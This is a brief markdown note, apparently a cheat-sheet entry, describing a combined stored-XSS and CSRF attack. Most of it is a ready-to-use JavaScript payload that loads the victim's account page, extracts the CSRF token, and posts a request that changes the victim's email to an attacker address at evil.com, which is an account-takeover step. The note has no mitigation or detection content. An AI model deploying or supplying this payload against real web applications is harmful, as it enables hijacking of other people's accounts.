# XSS-to-CSRF

The code snippet provided demonstrates a **Cross-Site Request Forgery (CSRF)** attack utilizing a **Cross-Site Scripting (XSS)** vulnerability.

By combining a Stored XSS vulnerability to inject the malicious script and a CSRF attack to perform unauthorized actions on the victim's behalf, this code demonstrates a scenario where the victim would change his email address to one specified by the attacker in case the XSS payload gets triggered.

```JavaScript
var request = new XMLHttpRequest();
request.responseType = "document"
request.open("GET", "/my-account", true);

request.onload = function(e) {
  var csrf = e.target.response['body'].querySelectorAll('[name="csrf"]')[0].value;
  
  data = "email=attackerm@evil.com&csrf=" + csrf
  
  var request = new XMLHttpRequest();
  request.open("POST", "/my-account/change-email", true);
  request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  request.send(data);
}
request.send();
```
